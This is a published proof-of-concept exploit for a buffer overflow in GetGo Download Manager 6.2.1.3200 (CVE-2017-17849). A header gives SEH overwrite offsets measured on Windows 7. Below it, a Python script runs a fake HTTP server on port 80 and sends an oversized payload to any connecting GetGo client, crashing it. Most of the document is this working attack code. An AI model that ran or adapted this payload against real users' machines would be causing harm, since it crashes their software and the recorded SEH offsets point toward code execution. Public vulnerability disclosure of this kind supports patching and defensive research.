# Exploit Title: GetGo Download Manager 6.2.1.3200 - Buffer Overflow (Denial of Service)
# Date: 2018-07-25
# Exploit Author: Nathu Nandwani
# Website: http://nandtech.co
# CVE: CVE-2017-17849
# Tested On: Windows 7 x86, Windows 10 x64 
#
# Details
# 
# The downloader feature of GetGo Download Manager is vulnerable 
# to a buffer overflow which can cause a denial of service.
# To test the proof of concept, have it executed in your machine
# and let the GetGo application download 'index.html' from your 
# given IP.
#
# SEH details (Windows 7 x86):
#
# SEH chain of thread 00000644, item 1
# Address=0863E2C8
# SE handler=68463967 <-> 4108 offset
#
# SEH chain of thread 00000644, item 2
# Address=46386746 <-> 4104 offset
# SE handler=*** CORRUPT ENTRY ***

import socket
 
server_ip = "0.0.0.0"
server_port = 80
payload = "A" * 4104 + "BBBB" + "\xcc\xcc\xcc\xcc" + "D" * 11000 + "\r\n"
  
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((server_ip, server_port))
sock.listen(1)

print "Currently listening at " + server_ip + ":" + str(server_port)  

client, (client_host, client_port) = sock.accept()
print "Client connected: " + client_host + ":" + str(client_port)
print ""
print client.recv(1000)

client.send(payload)
print "Sent payload"

client.close()
sock.close()